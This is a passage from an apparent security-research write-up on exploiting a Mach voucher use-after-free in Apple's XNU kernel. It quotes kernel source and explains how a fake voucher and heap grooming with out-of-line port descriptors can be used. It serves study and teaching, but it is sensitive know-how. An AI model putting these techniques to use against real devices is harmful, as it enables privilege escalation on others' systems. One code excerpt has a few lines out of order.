<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">thread_act_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">2597</span><span class="o">:</span> <span class="cm">/* Routine thread_get_mach_voucher */</span>
    <span class="mi">2598</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xthread_get_mach_voucher</span>
    <span class="mi">2599</span><span class="o">:</span> 	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">2600</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">2601</span><span class="o">:</span> 
    <span class="mi">2602</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2603</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">2604</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2605</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">2606</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">2607</span><span class="o">:</span> 		<span class="n">NDR_record_t</span> <span class="n">NDR</span><span class="p">;</span>
    <span class="mi">2608</span><span class="o">:</span> 		<span class="n">mach_voucher_selector_t</span> <span class="n">which</span><span class="p">;</span>
    <span class="mi">2609</span><span class="o">:</span> 		<span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">2610</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2611</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2612</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">2613</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2614</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__thread_get_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">2615</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Reply__thread_get_mach_voucher_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2616</span><span class="o">:</span> 
    <span class="mi">2617</span><span class="o">:</span> 	<span class="cm">/*
    2618: 	 * typedef struct {
    2619: 	 * 	mach_msg_header_t Head;
    2620: 	 * 	NDR_record_t NDR;
    2621: 	 * 	kern_return_t RetCode;
    2622: 	 * } mig_reply_error_t;
    2623: 	 */</span>
    <span class="mi">2624</span><span class="o">:</span> 
    <span class="mi">2625</span><span class="o">:</span> 	<span class="n">Request</span> <span class="o">*</span><span class="n">In0P</span> <span class="o">=</span> <span class="p">(</span><span class="n">Request</span> <span class="o">*</span><span class="p">)</span> <span class="n">InHeadP</span><span class="p">;</span>
    <span class="mi">2626</span><span class="o">:</span> 	<span class="n">Reply</span> <span class="o">*</span><span class="n">OutP</span> <span class="o">=</span> <span class="p">(</span><span class="n">Reply</span> <span class="o">*</span><span class="p">)</span> <span class="n">OutHeadP</span><span class="p">;</span>
    <span class="mi">2627</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>	<span class="n">__MIG_check__Request__thread_get_mach_voucher_t__defined</span>
    <span class="mi">2628</span><span class="o">:</span> 	<span class="n">kern_return_t</span> <span class="n">check_result</span><span class="p">;</span>
    <span class="mi">2629</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MIG_check__Request__thread_get_mach_voucher_t__defined */</span>
    <span class="mi">2630</span><span class="o">:</span> 
    <span class="mi">2631</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigKernelSpecificCode</span>
    <span class="mi">2632</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">UseStaticTemplates</span>
    <span class="mi">2633</span><span class="o">:</span> 	<span class="k">const</span> <span class="k">static</span> <span class="n">mach_msg_port_descriptor_t</span> <span class="n">voucherTemplate</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mi">2634</span><span class="o">:</span> 		<span class="cm">/* name = */</span>		<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    <span class="mi">2635</span><span class="o">:</span> 		<span class="cm">/* pad1 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2636</span><span class="o">:</span> 		<span class="cm">/* pad2 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2637</span><span class="o">:</span> 		<span class="cm">/* disp = */</span>		<span class="mi">17</span><span class="p">,</span>
    <span class="mi">2638</span><span class="o">:</span> 		<span class="cm">/* type = */</span>		<span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">,</span>
    <span class="mi">2639</span><span class="o">:</span> 	<span class="p">};</span>
    <span class="mi">2640</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2641</span><span class="o">:</span> 
    <span class="mi">2642</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">2643</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">UseStaticTemplates</span>
    <span class="mi">2644</span><span class="o">:</span> 	<span class="k">const</span> <span class="k">static</span> <span class="n">mach_msg_port_descriptor_t</span> <span class="n">voucherTemplate</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mi">2645</span><span class="o">:</span> 		<span class="cm">/* name = */</span>		<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    <span class="mi">2646</span><span class="o">:</span> 		<span class="cm">/* pad1 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2647</span><span class="o">:</span> 		<span class="cm">/* pad2 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2648</span><span class="o">:</span> 		<span class="cm">/* disp = */</span>		<span class="mi">19</span><span class="p">,</span>
    <span class="mi">2649</span><span class="o">:</span> 		<span class="cm">/* type = */</span>		<span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">,</span>
    <span class="mi">2650</span><span class="o">:</span> 	<span class="p">};</span>
    <span class="mi">2651</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2652</span><span class="o">:</span> 
    <span class="mi">2653</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">2654</span><span class="o">:</span> 	<span class="n">kern_return_t</span> <span class="n">RetCode</span><span class="p">;</span>
    <span class="mi">2655</span><span class="o">:</span> 	<span class="n">thread_act_t</span> <span class="n">thr_act</span><span class="p">;</span>
    <span class="mi">2656</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">;</span>
    <span class="mi">2657</span><span class="o">:</span> 
    <span class="mi">2658</span><span class="o">:</span> 	<span class="n">__DeclareRcvRpc</span><span class="p">(</span><span class="mi">3625</span><span class="p">,</span> <span class="s">"thread_get_mach_voucher"</span><span class="p">)</span>
    <span class="mi">2659</span><span class="o">:</span> 	<span class="n">__BeforeRcvRpc</span><span class="p">(</span><span class="mi">3625</span><span class="p">,</span> <span class="s">"thread_get_mach_voucher"</span><span class="p">)</span>
    <span class="mi">2660</span><span class="o">:</span> 
    <span class="mi">2661</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">defined</span><span class="p">(</span><span class="n">__MIG_check__Request__thread_get_mach_voucher_t__defined</span><span class="p">)</span>
    <span class="mi">2662</span><span class="o">:</span> 	<span class="n">check_result</span> <span class="o">=</span> <span class="n">__MIG_check__Request__thread_get_mach_voucher_t</span><span class="p">((</span><span class="n">__Request</span> <span class="o">*</span><span class="p">)</span><span class="n">In0P</span><span class="p">);</span>
    <span class="mi">2663</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">check_result</span> <span class="o">!=</span> <span class="n">MACH_MSG_SUCCESS</span><span class="p">)</span>
    <span class="mi">2664</span><span class="o">:</span> 		<span class="p">{</span> <span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">check_result</span><span class="p">);</span> <span class="p">}</span>
    <span class="mi">2665</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* defined(__MIG_check__Request__thread_get_mach_voucher_t__defined) */</span>
    <span class="mi">2666</span><span class="o">:</span> 
    <span class="mi">2667</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">UseStaticTemplates</span>
    <span class="mi">2668</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span> <span class="o">=</span> <span class="n">voucherTemplate</span><span class="p">;</span>
    <span class="mi">2669</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2670</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">__MigKernelSpecificCode</span>
    <span class="mi">2671</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span>
    <span class="mi">2672</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">2673</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">=</span> <span class="mi">19</span><span class="p">;</span>
    <span class="mi">2674</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">2675</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="o">!</span><span class="p">(</span><span class="n">defined</span><span class="p">(</span><span class="n">KERNEL</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">defined</span><span class="p">(</span><span class="n">__LP64__</span><span class="p">))</span>
    <span class="mi">2676</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">pad1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="mi">2677</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2678</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">pad2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="mi">2679</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">;</span>
    <span class="mi">2680</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">defined</span><span class="p">(</span><span class="n">KERNEL</span><span class="p">)</span>
    <span class="mi">2681</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">pad_end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="mi">2682</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2683</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2684</span><span class="o">:</span> 
    <span class="mi">2685</span><span class="o">:</span> 
    <span class="mi">2686</span><span class="o">:</span> 	<span class="n">thr_act</span> <span class="o">=</span> <span class="n">convert_port_to_thread</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>
    <span class="mi">2687</span><span class="o">:</span> 
    <span class="mi">2688</span><span class="o">:</span> 	<span class="n">RetCode</span> <span class="o">=</span> <span class="n">thread_get_mach_voucher</span><span class="p">(</span><span class="n">thr_act</span><span class="p">,</span> <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">which</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2689</span><span class="o">:</span> 	<span class="n">thread_deallocate</span><span class="p">(</span><span class="n">thr_act</span><span class="p">);</span>
    <span class="mi">2690</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2691</span><span class="o">:</span> 		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
    <span class="mi">2692</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">2693</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigKernelSpecificCode</span>
    <span class="mi">2694</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">2695</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2696</span><span class="o">:</span> 
    <span class="mi">2697</span><span class="o">:</span> 
    <span class="mi">2698</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">|=</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">;</span>
    <span class="mi">2699</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Reply</span><span class="p">));</span>
    <span class="mi">2700</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">msgh_body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="mi">2701</span><span class="o">:</span> 	<span class="n">__AfterRcvRpc</span><span class="p">(</span><span class="mi">3625</span><span class="p">,</span> <span class="s">"thread_get_mach_voucher"</span><span class="p">)</span>
    <span class="mi">2702</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>Then there is the call to <strong>convert_voucher_to_port</strong> on Line 2695 which looks like this.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">492</span><span class="o">:</span> <span class="cm">/*
    493:  * Convert a voucher to a port.
    494:  */</span>
    <span class="mi">495</span><span class="o">:</span> <span class="n">ipc_port_t</span>
    <span class="mi">496</span><span class="o">:</span> <span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">497</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">498</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>	<span class="n">port</span><span class="p">,</span> <span class="n">send</span><span class="p">;</span>
    <span class="mi">499</span><span class="o">:</span> 
    <span class="mi">500</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IV_NULL</span> <span class="o">==</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">501</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">IP_NULL</span><span class="p">);</span>
    <span class="mi">502</span><span class="o">:</span> 
    <span class="mi">503</span><span class="o">:</span> 	<span class="n">assert</span><span class="p">(</span><span class="n">os_ref_get_count</span><span class="p">(</span><span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="mi">504</span><span class="o">:</span> 
    <span class="mi">505</span><span class="o">:</span> 	<span class="cm">/* create a port if needed */</span>
    <span class="mi">506</span><span class="o">:</span> 	<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">507</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">508</span><span class="o">:</span> 		<span class="n">port</span> <span class="o">=</span> <span class="n">ipc_port_alloc_kernel</span><span class="p">();</span>
    <span class="mi">509</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">510</span><span class="o">:</span> 		<span class="n">ipc_kobject_set_atomically</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">511</span><span class="o">:</span> 
    <span class="mi">512</span><span class="o">:</span> 		<span class="cm">/* If we lose the race, deallocate and pick up the other guy's port */</span>
    <span class="mi">513</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">OSCompareAndSwapPtr</span><span class="p">(</span><span class="n">IP_NULL</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">514</span><span class="o">:</span> 			<span class="n">ipc_port_dealloc_kernel</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">515</span><span class="o">:</span> 			<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">516</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">517</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span> <span class="o">==</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">518</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">519</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">520</span><span class="o">:</span> 	</code></pre></figure>

<p>One of the first things which is checked on Line 503 is whether the voucher has a proper ref count. Then on line 507, the voucher’s port is being checked for validity. If it is not valid, a freshly new voucher port is allocated. This is great because while allocating a fake voucher in place of the freed voucher, if we somehow keep the <strong>iv_port</strong> pointer to be <strong>NULL</strong>, then we can actually also get a freshly allocated voucher port (<strong>IKOT_VOUCHER</strong>) for that particular voucher back to userspace, which we can then reference with <strong>ith_voucher-&gt;iv_port</strong>. This will allow us to further manipulate the voucher.</p>

<h3 id="heap-feng-shu-via-ool-ports-descriptor">Heap Feng Shu via OOL Ports Descriptor</h3>

<p>As discussed briefly in Part 1, complex Mach Messages have a descriptor field, which could be of four types.</p>

<ul>
  <li><strong>MACH_MSG_PORT_DESCRIPTOR</strong>: Sending a port in a message</li>
  <li><strong>MACH_MSG_OOL_DESCRIPTOR</strong>: Sending OOL data in a message</li>
  <li><strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>: Sending OOL ports array in a message</li>
  <li><strong>MACH_MSG_OOL_VOLATILE_DESCRIPTOR</strong>: Sending volatile data in a message</li>
</ul>

<p>When a Mach message is sent with <strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>, it calls the function <strong>ipc_kmsg_copyin_ool_ports_descriptor</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_kmsg</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">2799</span><span class="o">:</span> <span class="n">mach_msg_descriptor_t</span> <span class="o">*</span>
    <span class="mi">2800</span><span class="o">:</span> <span class="n">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="p">(</span>
    <span class="mi">2801</span><span class="o">:</span> 	<span class="n">mach_msg_ool_ports_descriptor_t</span> <span class="o">*</span><span class="n">dsc</span><span class="p">,</span>
    <span class="mi">2802</span><span class="o">:</span> 	<span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="n">user_dsc</span><span class="p">,</span>
    <span class="mi">2803</span><span class="o">:</span> 	<span class="kt">int</span> <span class="n">is_64bit</span><span class="p">,</span>
    <span class="mi">2804</span><span class="o">:</span> 	<span class="n">vm_map_t</span> <span class="n">map</span><span class="p">,</span>
    <span class="mi">2805</span><span class="o">:</span> 	<span class="n">ipc_space_t</span> <span class="n">space</span><span class="p">,</span>
    <span class="mi">2806</span><span class="o">:</span> 	<span class="n">ipc_object_t</span> <span class="n">dest</span><span class="p">,</span>
    <span class="mi">2807</span><span class="o">:</span> 	<span class="n">ipc_kmsg_t</span> <span class="n">kmsg</span><span class="p">,</span>
    <span class="mi">2808</span><span class="o">:</span> 	<span class="n">mach_msg_option_t</span> <span class="o">*</span><span class="n">optionp</span><span class="p">,</span>
    <span class="mi">2809</span><span class="o">:</span> 	<span class="n">mach_msg_return_t</span> <span class="o">*</span><span class="n">mr</span><span class="p">)</span>
    <span class="mi">2810</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">2811</span><span class="o">:</span>     <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
    <span class="mi">2812</span><span class="o">:</span>     <span class="n">ipc_object_t</span> <span class="o">*</span><span class="n">objects</span><span class="p">;</span>
    <span class="mi">2813</span><span class="o">:</span>     <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="mi">2814</span><span class="o">:</span>     <span class="n">mach_vm_offset_t</span> <span class="n">addr</span><span class="p">;</span>
    <span class="mi">2865</span><span class="o">:</span>     <span class="k">if</span> <span class="p">(</span><span class="n">os_mul_overflow</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">ports_length</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">2866</span><span class="o">:</span>         <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_TOO_LARGE</span><span class="p">;</span>
    <span class="mi">2867</span><span class="o">:</span>         <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2868</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2815</span><span class="o">:</span>     <span class="n">mach_msg_type_name_t</span> <span class="n">user_disp</span><span class="p">;</span>
    <span class="mi">2874</span><span class="o">:</span> 
    <span class="mi">2875</span><span class="o">:</span>     <span class="k">if</span> <span class="p">(</span><span class="n">ports_length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2876</span><span class="o">:</span>         <span class="k">return</span> <span class="n">user_dsc</span><span class="p">;</span>
    <span class="mi">2877</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2878</span><span class="o">:</span> 
    <span class="mi">2879</span><span class="o">:</span>     <span class="n">data</span> <span class="o">=</span> <span class="n">kalloc</span><span class="p">(</span><span class="n">ports_length</span><span class="p">);</span>
    <span class="mi">2880</span><span class="o">:</span> 
    <span class="mi">2881</span><span class="o">:</span>     <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2882</span><span class="o">:</span>         <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_NO_BUFFER</span><span class="p">;</span>
    <span class="mi">2883</span><span class="o">:</span>         <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2884</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2902</span><span class="o">:</span>     <span class="n">objects</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_object_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
    <span class="mi">2903</span><span class="o">:</span>     <span class="n">dsc</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="mi">2904</span><span class="o">:</span> 
    <span class="mi">2905</span><span class="o">:</span>     <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2906</span><span class="o">:</span>         <span class="n">mach_port_name_t</span> <span class="n">name</span> <span class="o">=</span> <span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="mi">2907</span><span class="o">:</span>         <span class="n">ipc_object_t</span> <span class="n">object</span><span class="p">;</span>
    <span class="mi">2908</span><span class="o">:</span> 
    <span class="mi">2909</span><span class="o">:</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">name</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">2910</span><span class="o">:</span>             <span class="n">objects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_object_t</span><span class="p">)</span><span class="n">CAST_MACH_NAME_TO_PORT</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">2911</span><span class="o">:</span>             <span class="k">continue</span><span class="p">;</span>
    <span class="mi">2912</span><span class="o">:</span>         <span class="p">}</span>
    <span class="mi">2913</span><span class="o">:</span> 
    <span class="mi">2914</span><span class="o">:</span>         <span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">ipc_object_copyin</span><span class="p">(</span><span class="n">space</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">user_disp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">object</span><span class="p">);</span>
    <span class="mi">2915</span><span class="o">:</span> 
    <span class="mi">2916</span><span class="o">:</span>         <span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2917</span><span class="o">:</span>             <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
    <span class="mi">2918</span><span class="o">:</span> 
    <span class="mi">2919</span><span class="o">:</span>             <span class="k">for</span><span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2920</span><span class="o">:</span>                 <span class="n">object</span> <span class="o">=</span> <span class="n">objects</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
    <span class="mi">2921</span><span class="o">:</span>                 <span class="k">if</span> <span class="p">(</span><span class="n">IPC_OBJECT_VALID</span><span class="p">(</span><span class="n">object</span><span class="p">))</span>
    <span class="mi">2922</span><span class="o">:</span>                     <span class="n">ipc_object_destroy</span><span class="p">(</span><span class="n">object</span><span class="p">,</span> <span class="n">result_disp</span><span class="p">);</span>
    <span class="mi">2923</span><span class="o">:</span>             <span class="p">}</span>
    <span class="mi">2924</span><span class="o">:</span>             <span class="n">kfree</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">ports_length</span><span class="p">);</span>
    <span class="mi">2925</span><span class="o">:</span>             <span class="n">dsc</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2926</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">optionp</span> <span class="o">&amp;</span> <span class="n">MACH_SEND_KERNEL</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
